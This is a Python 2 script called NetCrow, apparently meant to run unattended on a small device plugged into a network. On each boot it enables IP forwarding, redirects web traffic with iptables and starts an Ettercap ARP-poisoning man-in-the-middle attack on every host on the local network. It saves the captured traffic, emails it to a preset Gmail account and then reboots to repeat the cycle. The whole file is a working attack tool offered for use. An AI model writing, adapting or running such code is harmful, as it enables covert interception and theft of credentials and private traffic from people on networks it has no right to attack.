# Imports
import os
import time
import subprocess
import smtplib
import datetime
import os.path
import sys
from email.mime.text import MIMEText


# Define Attributes

Version = "2.3"
Creator = "Raspberry"
Published = "https://github.com/Raspberryy/NetCrow"

nettest = 0
SendBoot = 0
BootBol = 0 
rebootbol = 0
Path = os.path.dirname(os.path.abspath(__file__))

Sender = ""
Password = ""
Reciever = ""

SaveDelay = 15		# Time Delay before Saving 
ReRun = 10		# Repetition of Saving


# Define Colours

pink = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yell = '\033[93m'
red = '\033[91m'
white = '\033[0m'
bold = '\033[1m'
under = '\033[4m'


# Define Functions

def SendMail(Subject, Text):

	# Connect to Server
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	server.ehlo
	server.login(Sender, Password)
	
	# Set Text and Subject
	Message = 'Subject: %s\n\n%s' % (Subject, Text)


	# Sending Email
	try:
	        server.sendmail(Sender, Reciever, Message)
	except:
		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
        	Date = time.strftime("%d/%m/%Y")
		tempcmd = "echo Email sending Fail -  " + Time + " the " + Date + " > error.log"
		os.system(tempcmd)
	server.quit()


 
def SendBootUp():
	
	# Send Mail after Boot
	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
	Date = time.strftime("%d/%m/%Y")
	Sub = "NetCrow has started working at " + Time + " the " + Date + " !!!" 
	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
        interface_get = os.popen(interface_comm).read()
        interface = interface_get[0:4]
	if interface == "wlan":
                interface = "wlan0"
	# Get IP Adress
	ipaddress_comm = "hostname -I"
	ipaddress_get = os.popen(ipaddress_comm).read()
	Text = "Interface	    " + interface +"\nNetwork IP	" + ipaddress_get  
	SendMail(Sub, Text)


def StartAttack():
	
	# Set up Interface String
	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
	interface_get = os.popen(interface_comm).read()
	interface = interface_get[0:4]
	if interface == "wlan":
		interface = "wlan0"
		
	# Set up Environment
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") 
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080") 
	
	# Start Ettercap
	try:
                command = "ettercap -T -q -i " + interface + " -M arp /// /// >" + Path + "/ettercap.txt &"
                os.system(command)
        except:
                print red + "Error - Starting Ettercap failed" + white
        else:
                command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &"
                os.system(command)
	
	
def GetUpTime():
	UpRead = os.popen("uptime").read()
	UpTime = UpRead[12:25]
	return UpTime

def AutoEmailSend():
	
	# Loop 
	BackupsAnzahl = 0 
	while BackupsAnzahl < ReRun:
		time.sleep(SaveDelay)
		SaveOldFile()
		BackupsAnzahl = BackupsAnzahl + 1

	# Send Mail
	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
       	Date = time.strftime("%d/%m/%Y")
	SubjectAttackFinished = "New Informations - " + Time + " the " + Date + " !!!"
	
	# Getting and Setting Text
	ettertext = open(Path + "/ettercap.txt", 'rb')
	ettermsg = MIMEText(ettertext.read())
	ettertext.close()
	TextAttackFinished = ettermsg

	# Sending Email
	SendMail(SubjectAttackFinished, TextAttackFinished)
		
def SaveOldFile():

	SaveStat = 0 
	vartemp = 0
	while SaveStat == 0: 
		commandtempif = Path + "/Logging/ettercap" + str(vartemp)  + ".txt"
		if (os.path.isfile(commandtempif)):
                        vartemp = vartemp + 1 
		else:
			commtemp = "cp " + Path  + "/ettercap.txt " + Path  + "/Logging/ettercap" + str(vartemp)  + ".txt"
                        os.system(commtemp)
			SaveStat = 1 

def AttackOnly():
	
	# Set up Interface String
        interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
        interface_get = os.popen(interface_comm).read()
        interface = interface_get[0:4]
        if interface == "wlan":
                interface = "wlan0"

        # Set up Environment
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

        # Start Ettercap
        try:
                command = "ettercap -T -q -i " + interface + " -M arp /// ///"
                os.system(command)
        except:
                print red + "Error - Starting Ettercap failed" + white
        else:
                command = "ettercap -T -q -i " + interface + " -M arp // //"
                os.system(command)	

def TestMail():
	SendMail("It works!", "This is a Test-Mail generated by NetCrow")	

def DeleteBackup():
	print ""
	print red + "	Clearing Backup Data" + white
	print ""
	time.sleep(2)
	clearcommand = "rm " + Path + "/Logging/ettercap*"	
	clearfile = "rm " + Path + "/ettercap.txt"
	os.system(clearcommand)
	os.system(clearfile)
	

def PrintHelp():
	print ""
	print green + under +  "		NETCROW - BY RASPBERRYY" + white	
	print ""
	print "	Command List:"
	print "	 -a             Start Attack manually"
	print "	 -d             Delete Backups in Logging"	
	print "	 -h --help	Prints this"	
	print "	 -r 		Prevent Reboot"
	print "	 -s             Prevent NetCrow Start Message"
	print "	 -t		Send Test E-Mail"
	print ""


def BootingAttack():	
	if SendBoot != 1:
        	SendBootUp()

	try:
        	StartAttack()
	except:
        	ErrSub = "Starting the Atttack FAILED"
        	try:
                	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
                	interface_get = os.popen(interface_comm).read()
                	UpTimeTemp = GetUpTime()
                	interface = interface_get[0:4]
                	ErrText = "Connection to Internet               Yes \nConnection to Network via " + interface + "\nUptime                             " + UpTimeTemp
        	except:
                	ErrText = "Connection to Internet               Yes \nConnection to Network             No" + "\nUptime                            " + UpTimeTemp
		
        	SendMail(ErrSub, ErrText)


	# Preparing Reboot
	AutoEmailSend()
	SaveOldFile()
	os.system("rm "+ Path  + "/ettercap.txt")
	if rebootbol != 1:
	        os.system("reboot")	






# Main Program - Test for Commands

if len(sys.argv)==1:
	sys.argv.append(" ")
if len(sys.argv)==2:
	sys.argv.append(" ")

if sys.argv[1]=="-h":
        PrintHelp()
	BootBol = 1
elif sys.argv[2]=="-h":
        PrintHelp()
	BootBol = 1
elif sys.argv[1]=="--help":
        PrintHelp()
	BootBol = 1
elif sys.argv[2]=="--help":
        PrintHelp()
	BootBol = 1

elif sys.argv[1]=="-r":
	rebootbol = 1
elif sys.argv[2]=="-r":
	rebootbol = 1

elif sys.argv[1]=="-a":
	AttackOnly()
	BootBol = 1
elif sys.argv[2]=="-a":
	AttackOnly()
	BootBol = 1

elif sys.argv[1]=="-s":
        SendBoot = 1
elif sys.argv[2]=="-s":
        SendBoot = 1

elif sys.argv[1]=="-t":
        TestMail()
	BootBol = 1
elif sys.argv[2]=="-t":
        TestMail()
	BootBol = 1	

elif sys.argv[1]=="-d":
        DeleteBackup()
        BootBol = 1
elif sys.argv[2]=="-d":
        DeleteBackup()
        BootBol = 1

		


# No Commands - Starting Normal Booting Attack

if BootBol != 1:
	BootingAttack()
